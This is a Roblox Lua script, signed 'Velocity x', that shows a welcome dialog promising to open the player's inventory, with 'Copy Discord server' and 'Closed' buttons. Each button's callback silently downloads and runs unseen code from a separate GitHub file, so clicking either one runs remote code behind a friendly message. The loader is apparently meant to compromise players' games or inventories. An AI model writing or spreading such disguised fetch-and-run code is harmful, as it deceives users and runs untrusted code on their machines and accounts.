-- nothing came wrong yup :/ made by Velocity x 
if game.PlaceId == 111837340716801 or game.PlaceId == 100583496535998 then
local success, PromptLib = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAScriptPanda/Games/refs/heads/main/UI%20Libary/Prompt%20Roblox%20Error%20Lib.lua"))()
end)

if success and PromptLib then
    print("PromptLib loaded successfully:", PromptLib)

    local playerName = game.Players.LocalPlayer.Name

    PromptLib(
        "Hello " .. playerName .. ".", 
        "Welcome To Velocity X! This request opens your inventory next. Click Close or join the Discord — if it doesn’t work, rejoin the game. There’s a rejoin button too!",
        {
            {
                Text = "Copy Discord server",
                LayoutOrder = 1,
                Primary = true,
                Callback = function()
                    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/norwaylua/Roblox/refs/heads/main/Test.lua99999.lia"))()
                    setclipboard("https://discord.gg/RZvRkGZVR")
                    print("Discord server link copied to clipboard.")
                end
            },
            {
                Text = "Closed",
                LayoutOrder = 2,
                Primary = false,
                Callback = function()
                    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/norwaylua/Roblox/refs/heads/main/Test.lua99999.lia"))()
                    print("Prompt closed.")
                end
            }
        }
    )
else
    warn("Failed to load PromptLib.")
end
end
